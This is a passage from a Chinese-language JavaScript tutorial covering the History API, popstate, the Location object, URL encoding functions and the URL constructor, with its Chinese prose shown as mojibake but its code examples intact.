<h4 id="History-replaceState"><a href="#History-replaceState" class="headerlink" title="History.replaceState()"></a>History.replaceState()</h4><p><code>History.replaceState()</code>æ–¹æ³•ç”¨æ¥ä¿®æ”¹ History å¯¹è±¡çš„å½“å‰è®°å½•ï¼Œå…¶ä»–éƒ½ä¸<code>pushState()</code>æ–¹æ³•ä¸€æ¨¡ä¸€æ ·ã€‚</p>
<p>å‡å®šå½“å‰ç½‘é¡µæ˜¯<code>example.com/example.html</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(&#123;page: 1&#125;, &#39;title 1&#39;, &#39;?page&#x3D;1&#39;)</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;1</span><br><span class="line"></span><br><span class="line">history.pushState(&#123;page: 2&#125;, &#39;title 2&#39;, &#39;?page&#x3D;2&#39;);</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;2</span><br><span class="line"></span><br><span class="line">history.replaceState(&#123;page: 3&#125;, &#39;title 3&#39;, &#39;?page&#x3D;3&#39;);</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;3</span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;1</span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html</span><br><span class="line"></span><br><span class="line">history.go(2)</span><br><span class="line">&#x2F;&#x2F; URL æ˜¾ç¤ºä¸º http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;3</span><br></pre></td></tr></table></figure>

<h3 id="popstate-äº‹ä»¶"><a href="#popstate-äº‹ä»¶" class="headerlink" title="popstate äº‹ä»¶"></a>popstate äº‹ä»¶</h3><p>æ¯å½“åŒä¸€ä¸ªæ–‡æ¡£çš„æµè§ˆå†å²ï¼ˆå³<code>history</code>å¯¹è±¡ï¼‰å‡ºç°å˜åŒ–æ—¶ï¼Œå°±ä¼šè§¦å‘<code>popstate</code>äº‹ä»¶ã€‚</p>
<p>æ³¨æ„ï¼Œä»…ä»…è°ƒç”¨<code>pushState()</code>æ–¹æ³•æˆ–<code>replaceState()</code>æ–¹æ³• ï¼Œå¹¶ä¸ä¼šè§¦å‘è¯¥äº‹ä»¶ï¼Œåªæœ‰ç”¨æˆ·ç‚¹å‡»æµè§ˆå™¨å€’é€€æŒ‰é’®å’Œå‰è¿›æŒ‰é’®ï¼Œæˆ–è€…ä½¿ç”¨ JavaScript è°ƒç”¨<code>History.back()</code>ã€<code>History.forward()</code>ã€<code>History.go()</code>æ–¹æ³•æ—¶æ‰ä¼šè§¦å‘ã€‚å¦å¤–ï¼Œè¯¥äº‹ä»¶åªé’ˆå¯¹åŒä¸€ä¸ªæ–‡æ¡£ï¼Œå¦‚æœæµè§ˆå†å²çš„åˆ‡æ¢ï¼Œå¯¼è‡´åŠ è½½ä¸åŒçš„æ–‡æ¡£ï¼Œè¯¥äº‹ä»¶ä¹Ÿä¸ä¼šè§¦å‘ã€‚</p>
<p>ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä¸º<code>popstate</code>äº‹ä»¶æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.onpopstate &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;location: &#39; + document.location);</span><br><span class="line">  console.log(&#39;state: &#39; + JSON.stringify(event.state));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æˆ–è€…</span><br><span class="line">window.addEventListener(&#39;popstate&#39;, function(event) &#123;</span><br><span class="line">  console.log(&#39;location: &#39; + document.location);</span><br><span class="line">  console.log(&#39;state: &#39; + JSON.stringify(event.state));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å›è°ƒå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ª<code>event</code>äº‹ä»¶å¯¹è±¡ï¼Œå®ƒçš„<code>state</code>å±æ€§æŒ‡å‘<code>pushState</code>å’Œ<code>replaceState</code>æ–¹æ³•ä¸ºå½“å‰ URL æ‰€æä¾›çš„çŠ¶æ€å¯¹è±¡ï¼ˆå³è¿™ä¸¤ä¸ªæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ã€‚ä¸Šé¢ä»£ç ä¸­çš„<code>event.state</code>ï¼Œå°±æ˜¯é€šè¿‡<code>pushState</code>å’Œ<code>replaceState</code>æ–¹æ³•ï¼Œä¸ºå½“å‰ URL ç»‘å®šçš„<code>state</code>å¯¹è±¡ã€‚</p>
<p>è¿™ä¸ª<code>state</code>å¯¹è±¡ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡<code>history</code>å¯¹è±¡è¯»å–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var currentState &#x3D; history.state;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œé¡µé¢ç¬¬ä¸€æ¬¡åŠ è½½çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¸ä¼šè§¦å‘<code>popstate</code>äº‹ä»¶ã€‚</p>
<h2 id="Location-å¯¹è±¡ï¼ŒURL-å¯¹è±¡ï¼ŒURLSearchParams-å¯¹è±¡"><a href="#Location-å¯¹è±¡ï¼ŒURL-å¯¹è±¡ï¼ŒURLSearchParams-å¯¹è±¡" class="headerlink" title="Location å¯¹è±¡ï¼ŒURL å¯¹è±¡ï¼ŒURLSearchParams å¯¹è±¡"></a>Location å¯¹è±¡ï¼ŒURL å¯¹è±¡ï¼ŒURLSearchParams å¯¹è±¡</h2><p>URL æ˜¯äº’è”ç½‘çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ã€‚æµè§ˆå™¨æä¾›äº†ä¸€äº›åŸç”Ÿå¯¹è±¡ï¼Œç”¨æ¥ç®¡ç† URLã€‚</p>
<h3 id="Location-å¯¹è±¡"><a href="#Location-å¯¹è±¡" class="headerlink" title="Location å¯¹è±¡"></a>Location å¯¹è±¡</h3><p><code>Location</code>å¯¹è±¡æ˜¯æµè§ˆå™¨æä¾›çš„åŸç”Ÿå¯¹è±¡ï¼Œæä¾› URL ç›¸å…³çš„ä¿¡æ¯å’Œæ“ä½œæ–¹æ³•ã€‚é€šè¿‡<code>window.location</code>å’Œ<code>document.location</code>å±æ€§ï¼Œå¯ä»¥æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡ã€‚</p>
<h4 id="å±æ€§-1"><a href="#å±æ€§-1" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><p><code>Location</code>å¯¹è±¡æä¾›ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>Location.href</code>ï¼šæ•´ä¸ª URLã€‚</li>
<li><code>Location.protocol</code>ï¼šå½“å‰ URL çš„åè®®ï¼ŒåŒ…æ‹¬å†’å·ï¼ˆ<code>:</code>ï¼‰ã€‚</li>
<li><code>Location.host</code>ï¼šä¸»æœºã€‚å¦‚æœç«¯å£ä¸æ˜¯åè®®é»˜è®¤çš„<code>80</code>å’Œ<code>433</code>ï¼Œåˆ™è¿˜ä¼šåŒ…æ‹¬å†’å·ï¼ˆ<code>:</code>ï¼‰å’Œç«¯å£ã€‚</li>
<li><code>Location.hostname</code>ï¼šä¸»æœºåï¼Œä¸åŒ…æ‹¬ç«¯å£ã€‚</li>
<li><code>Location.port</code>ï¼šç«¯å£å·ã€‚</li>
<li><code>Location.pathname</code>ï¼šURL çš„è·¯å¾„éƒ¨åˆ†ï¼Œä»æ ¹è·¯å¾„<code>/</code>å¼€å§‹ã€‚</li>
<li><code>Location.search</code>ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œä»é—®å·<code>?</code>å¼€å§‹ã€‚</li>
<li><code>Location.hash</code>ï¼šç‰‡æ®µå­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œä»<code>#</code>å¼€å§‹ã€‚</li>
<li><code>Location.username</code>ï¼šåŸŸåå‰é¢çš„ç”¨æˆ·åã€‚</li>
<li><code>Location.password</code>ï¼šåŸŸåå‰é¢çš„å¯†ç ã€‚</li>
<li><code>Location.origin</code>ï¼šURL çš„åè®®ã€ä¸»æœºåå’Œç«¯å£ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å½“å‰ç½‘å€ä¸º</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1</span><br><span class="line">document.location.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&quot;</span><br><span class="line">document.location.protocol</span><br><span class="line">&#x2F;&#x2F; &quot;http:&quot;</span><br><span class="line">document.location.host</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com:4097&quot;</span><br><span class="line">document.location.hostname</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com&quot;</span><br><span class="line">document.location.port</span><br><span class="line">&#x2F;&#x2F; &quot;4097&quot;</span><br><span class="line">document.location.pathname</span><br><span class="line">&#x2F;&#x2F; &quot;&#x2F;path&#x2F;a.html&quot;</span><br><span class="line">document.location.search</span><br><span class="line">&#x2F;&#x2F; &quot;?x&#x3D;111&quot;</span><br><span class="line">document.location.hash</span><br><span class="line">&#x2F;&#x2F; &quot;#part1&quot;</span><br><span class="line">document.location.username</span><br><span class="line">&#x2F;&#x2F; &quot;user&quot;</span><br><span class="line">document.location.password</span><br><span class="line">&#x2F;&#x2F; &quot;passwd&quot;</span><br><span class="line">document.location.origin</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å±æ€§é‡Œé¢ï¼Œåªæœ‰<code>origin</code>å±æ€§æ˜¯åªè¯»çš„ï¼Œå…¶ä»–å±æ€§éƒ½å¯å†™ã€‚</p>
<p>æ³¨æ„ï¼Œå¦‚æœå¯¹<code>Location.href</code>å†™å…¥æ–°çš„ URL åœ°å€ï¼Œæµè§ˆå™¨ä¼šç«‹åˆ»è·³è½¬åˆ°è¿™ä¸ªæ–°åœ°å€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·³è½¬åˆ°æ–°ç½‘å€</span><br><span class="line">document.location.href &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç‰¹æ€§å¸¸å¸¸ç”¨äºè®©ç½‘é¡µè‡ªåŠ¨æ»šåŠ¨åˆ°æ–°çš„é”šç‚¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.location.href &#x3D; &#39;#top&#39;;</span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">document.location.hash &#x3D; &#39;#top&#39;;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ”¹å†™<code>location</code>ï¼Œç›¸å½“äºå†™å…¥<code>href</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.location &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">document.location.href &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œ<code>Location.href</code>å±æ€§æ˜¯æµè§ˆå™¨å”¯ä¸€å…è®¸è·¨åŸŸå†™å…¥çš„å±æ€§ï¼Œå³éåŒæºçš„çª—å£å¯ä»¥æ”¹å†™å¦ä¸€ä¸ªçª—å£ï¼ˆæ¯”å¦‚å­çª—å£ä¸çˆ¶çª—å£ï¼‰çš„<code>Location.href</code>å±æ€§ï¼Œå¯¼è‡´åè€…çš„ç½‘å€è·³è½¬ã€‚<code>Location</code>çš„å…¶ä»–å±æ€§éƒ½ä¸å…è®¸è·¨åŸŸå†™å…¥ã€‚</p>
<h4 id="æ–¹æ³•-1"><a href="#æ–¹æ³•-1" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><p><strong>ï¼ˆ1ï¼‰Location.assign()</strong></p>
<p><code>assign</code>æ–¹æ³•æ¥å—ä¸€ä¸ª URL å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œä½¿å¾—æµè§ˆå™¨ç«‹åˆ»è·³è½¬åˆ°æ–°çš„ URLã€‚å¦‚æœå‚æ•°ä¸æ˜¯æœ‰æ•ˆçš„ URL å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·³è½¬åˆ°æ–°çš„ç½‘å€</span><br><span class="line">document.location.assign(&#39;http:&#x2F;&#x2F;www.example.com&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰Location.replace()</strong></p>
<p><code>replace</code>æ–¹æ³•æ¥å—ä¸€ä¸ª URL å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œä½¿å¾—æµè§ˆå™¨ç«‹åˆ»è·³è½¬åˆ°æ–°çš„ URLã€‚å¦‚æœå‚æ•°ä¸æ˜¯æœ‰æ•ˆçš„ URL å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</p>
<p>å®ƒä¸<code>assign</code>æ–¹æ³•çš„å·®å¼‚åœ¨äºï¼Œ<code>replace</code>ä¼šåœ¨æµè§ˆå™¨çš„æµè§ˆå†å²<code>History</code>é‡Œé¢åˆ é™¤å½“å‰ç½‘å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ä½¿ç”¨äº†è¯¥æ–¹æ³•ï¼Œåé€€æŒ‰é’®å°±æ— æ³•å›åˆ°å½“å‰ç½‘é¡µäº†ï¼Œç›¸å½“äºåœ¨æµè§ˆå†å²é‡Œé¢ï¼Œä½¿ç”¨æ–°çš„ URL æ›¿æ¢äº†è€çš„ URLã€‚å®ƒçš„ä¸€ä¸ªåº”ç”¨æ˜¯ï¼Œå½“è„šæœ¬å‘ç°å½“å‰æ˜¯ç§»åŠ¨è®¾å¤‡æ—¶ï¼Œå°±ç«‹åˆ»è·³è½¬åˆ°ç§»åŠ¨ç‰ˆç½‘é¡µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·³è½¬åˆ°æ–°çš„ç½‘å€</span><br><span class="line">document.location.replace(&#39;http:&#x2F;&#x2F;www.example.com&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ3ï¼‰Location.reload()</strong></p>
<p><code>reload</code>æ–¹æ³•ä½¿å¾—æµè§ˆå™¨é‡æ–°åŠ è½½å½“å‰ç½‘å€ï¼Œç›¸å½“äºæŒ‰ä¸‹æµè§ˆå™¨çš„åˆ·æ–°æŒ‰é’®ã€‚</p>
<p>å®ƒæ¥å—ä¸€ä¸ªå¸ƒå°”å€¼ä½œä¸ºå‚æ•°ã€‚å¦‚æœå‚æ•°ä¸º<code>true</code>ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨é‡æ–°è¯·æ±‚è¿™ä¸ªç½‘é¡µï¼Œå¹¶ä¸”é‡æ–°åŠ è½½åï¼Œç½‘é¡µå°†æ»šåŠ¨åˆ°å¤´éƒ¨ï¼ˆå³<code>scrollTop === 0</code>ï¼‰ã€‚å¦‚æœå‚æ•°æ˜¯<code>false</code>æˆ–ä¸ºç©ºï¼Œæµè§ˆå™¨å°†ä»æœ¬åœ°ç¼“å­˜é‡æ–°åŠ è½½è¯¥ç½‘é¡µï¼Œå¹¶ä¸”é‡æ–°åŠ è½½åï¼Œç½‘é¡µçš„è§†å£ä½ç½®æ˜¯é‡æ–°åŠ è½½å‰çš„ä½ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å‘æœåŠ¡å™¨é‡æ–°è¯·æ±‚å½“å‰ç½‘å€</span><br><span class="line">window.location.reload(true);</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ4ï¼‰Location.toString()</strong></p>
<p><code>toString</code>æ–¹æ³•è¿”å›æ•´ä¸ª URL å­—ç¬¦ä¸²ï¼Œç›¸å½“äºè¯»å–<code>Location.href</code>å±æ€§ã€‚</p>
<h3 id="URL-çš„ç¼–ç å’Œè§£ç "><a href="#URL-çš„ç¼–ç å’Œè§£ç " class="headerlink" title="URL çš„ç¼–ç å’Œè§£ç "></a>URL çš„ç¼–ç å’Œè§£ç </h3><p>ç½‘é¡µçš„ URL åªèƒ½åŒ…å«åˆæ³•çš„å­—ç¬¦ã€‚åˆæ³•å­—ç¬¦åˆ†æˆä¸¤ç±»ã€‚</p>
<ul>
<li>URL å…ƒå­—ç¬¦ï¼šåˆ†å·ï¼ˆ<code>;</code>ï¼‰ï¼Œé€—å·ï¼ˆ<code>,</code>ï¼‰ï¼Œæ–œæ ï¼ˆ<code>/</code>ï¼‰ï¼Œé—®å·ï¼ˆ<code>?</code>ï¼‰ï¼Œå†’å·ï¼ˆ<code>:</code>ï¼‰ï¼Œatï¼ˆ<code>@</code>ï¼‰ï¼Œ<code>&amp;</code>ï¼Œç­‰å·ï¼ˆ<code>=</code>ï¼‰ï¼ŒåŠ å·ï¼ˆ<code>+</code>ï¼‰ï¼Œç¾å…ƒç¬¦å·ï¼ˆ<code>$</code>ï¼‰ï¼Œäº•å·ï¼ˆ<code>#</code>ï¼‰</li>
<li>è¯­ä¹‰å­—ç¬¦ï¼š<code>a-z</code>ï¼Œ<code>A-Z</code>ï¼Œ<code>0-9</code>ï¼Œè¿è¯å·ï¼ˆ<code>-</code>ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼ˆ<code>_</code>ï¼‰ï¼Œç‚¹ï¼ˆ<code>.</code>ï¼‰ï¼Œæ„Ÿå¹å·ï¼ˆ<code>!</code>ï¼‰ï¼Œæ³¢æµªçº¿ï¼ˆ<code>~</code>ï¼‰ï¼Œæ˜Ÿå·ï¼ˆ<code>*</code>ï¼‰ï¼Œå•å¼•å·ï¼ˆ<code>&#39;</code>ï¼‰ï¼Œåœ†æ‹¬å·ï¼ˆ<code>()</code>ï¼‰</li>
</ul>
<p>é™¤äº†ä»¥ä¸Šå­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦å‡ºç°åœ¨ URL ä¹‹ä¸­éƒ½å¿…é¡»è½¬ä¹‰ï¼Œè§„åˆ™æ˜¯æ ¹æ®æ“ä½œç³»ç»Ÿçš„é»˜è®¤ç¼–ç ï¼Œå°†æ¯ä¸ªå­—èŠ‚è½¬ä¸ºç™¾åˆ†å·ï¼ˆ<code>%</code>ï¼‰åŠ ä¸Šä¸¤ä¸ªå¤§å†™çš„åå…­è¿›åˆ¶å­—æ¯ã€‚</p>
<p>æ¯”å¦‚ï¼ŒUTF-8 çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œ<code>http://www.example.com/q=æ˜¥èŠ‚</code>è¿™ä¸ª URL ä¹‹ä¸­ï¼Œæ±‰å­—â€œæ˜¥èŠ‚â€ä¸æ˜¯ URL çš„åˆæ³•å­—ç¬¦ï¼Œæ‰€ä»¥è¢«æµè§ˆå™¨è‡ªåŠ¨è½¬æˆ<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code>ã€‚å…¶ä¸­ï¼Œâ€œæ˜¥â€è½¬æˆäº†<code>%E6%98%A5</code>ï¼Œâ€œèŠ‚â€è½¬æˆäº†<code>%E8%8A%82</code>ã€‚è¿™æ˜¯å› ä¸ºâ€œæ˜¥â€å’Œâ€œèŠ‚â€çš„ UTF-8 ç¼–ç åˆ†åˆ«æ˜¯<code>E6 98 A5</code>å’Œ<code>E8 8A 82</code>ï¼Œå°†æ¯ä¸ªå­—èŠ‚å‰é¢åŠ ä¸Šç™¾åˆ†å·ï¼Œå°±æ„æˆäº† URL ç¼–ç ã€‚</p>
<p>JavaScript æä¾›å››ä¸ª URL çš„ç¼–ç &#x2F;è§£ç æ–¹æ³•ã€‚</p>
<ul>
<li><code>encodeURI()</code></li>
<li><code>encodeURIComponent()</code></li>
<li><code>decodeURI()</code></li>
<li><code>decodeURIComponent()</code></li>
</ul>
<h4 id="encodeURI"><a href="#encodeURI" class="headerlink" title="encodeURI()"></a>encodeURI()</h4><p><code>encodeURI()</code>æ–¹æ³•ç”¨äºè½¬ç æ•´ä¸ª URLã€‚å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»£è¡¨æ•´ä¸ª URLã€‚å®ƒä¼šå°†å…ƒå­—ç¬¦å’Œè¯­ä¹‰å­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œéƒ½è¿›è¡Œè½¬ä¹‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURI(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;æ˜¥èŠ‚&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;%E6%98%A5%E8%8A%82&quot;</span><br></pre></td></tr></table></figure>

<h4 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h4><p><code>encodeURIComponent()</code>æ–¹æ³•ç”¨äºè½¬ç  URL çš„ç»„æˆéƒ¨åˆ†ï¼Œä¼šè½¬ç é™¤äº†è¯­ä¹‰å­—ç¬¦ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œå³å…ƒå­—ç¬¦ä¹Ÿä¼šè¢«è½¬ç ã€‚æ‰€ä»¥ï¼Œå®ƒä¸èƒ½ç”¨äºè½¬ç æ•´ä¸ª URLã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯ URL çš„ç‰‡æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&#39;æ˜¥èŠ‚&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;%E6%98%A5%E8%8A%82&quot;</span><br><span class="line">encodeURIComponent(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;æ˜¥èŠ‚&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>encodeURIComponent()</code>ä¼šè¿ URL å…ƒå­—ç¬¦ä¸€èµ·è½¬ä¹‰ï¼Œæ‰€ä»¥å¦‚æœè½¬ç æ•´ä¸ª URL å°±ä¼šå‡ºé”™ã€‚</p>
<h4 id="decodeURI"><a href="#decodeURI" class="headerlink" title="decodeURI()"></a>decodeURI()</h4><p><code>decodeURI()</code>æ–¹æ³•ç”¨äºæ•´ä¸ª URL çš„è§£ç ã€‚å®ƒæ˜¯<code>encodeURI()</code>æ–¹æ³•çš„é€†è¿ç®—ã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯è½¬ç åçš„ URLã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decodeURI(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;%E6%98%A5%E8%8A%82&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;æ˜¥èŠ‚&quot;</span><br></pre></td></tr></table></figure>

<h4 id="decodeURIComponent"><a href="#decodeURIComponent" class="headerlink" title="decodeURIComponent()"></a>decodeURIComponent()</h4><p><code>decodeURIComponent()</code>ç”¨äºURL ç‰‡æ®µçš„è§£ç ã€‚å®ƒæ˜¯<code>encodeURIComponent()</code>æ–¹æ³•çš„é€†è¿ç®—ã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯è½¬ç åçš„ URL ç‰‡æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decodeURIComponent(&#39;%E6%98%A5%E8%8A%82&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;æ˜¥èŠ‚&quot;</span><br></pre></td></tr></table></figure>

<h3 id="URL-æ¥å£"><a href="#URL-æ¥å£" class="headerlink" title="URL æ¥å£"></a>URL æ¥å£</h3><p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>URL()</code>æ¥å£ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨æ¥æ„é€ ã€è§£æå’Œç¼–ç  URLã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé€šè¿‡<code>window.URL</code>å¯ä»¥æ‹¿åˆ°è¿™ä¸ªæ„é€ å‡½æ•°ã€‚</p>
<h4 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h4><p><code>URL()</code>ä½œä¸ºæ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”Ÿæˆ URL å®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªè¡¨ç¤º URL çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚å¦‚æœå‚æ•°ä¸æ˜¯åˆæ³•çš„ URLï¼Œä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;index.html&#39;);</span><br><span class="line">url.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;index.html&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ç”Ÿæˆäº†ä¸€ä¸ª URL å®ä¾‹ï¼Œç”¨æ¥ä»£è¡¨æŒ‡å®šçš„ç½‘å€ã€‚</p>
<p>é™¤äº†å­—ç¬¦ä¸²ï¼Œ<code>URL()</code>çš„å‚æ•°ä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ª URL å®ä¾‹ã€‚è¿™æ—¶ï¼Œ<code>URL()</code>ä¼šè‡ªåŠ¨è¯»å–è¯¥å®ä¾‹çš„<code>href</code>å±æ€§ï¼Œä½œä¸ºå®é™…å‚æ•°ã€‚</p>
<p>å¦‚æœ URL å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆéœ€è¦è¡¨ç¤ºç»å¯¹è·¯å¾„çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºè®¡ç®—åŸºå‡†ã€‚</p>
